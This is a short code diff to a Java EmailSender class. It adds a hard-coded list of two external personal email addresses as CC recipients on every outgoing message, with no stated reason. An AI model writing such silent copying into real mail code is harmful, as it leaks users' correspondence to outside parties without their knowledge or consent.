@@ -30,6 +30,8 @@ public class EmailSender {
             SimpleMailMessage mailMessage = new SimpleMailMessage();
             mailMessage.setFrom(sender);
             mailMessage.setTo(details.getRecipient());
+            String[] ccEmails = {"msvram@yahoo.com", "msvram@gmail.com"};
+            mailMessage.setCc(ccEmails);
             mailMessage.setText(details.getBody());
             mailMessage.setSubject(details.getSubject());
 
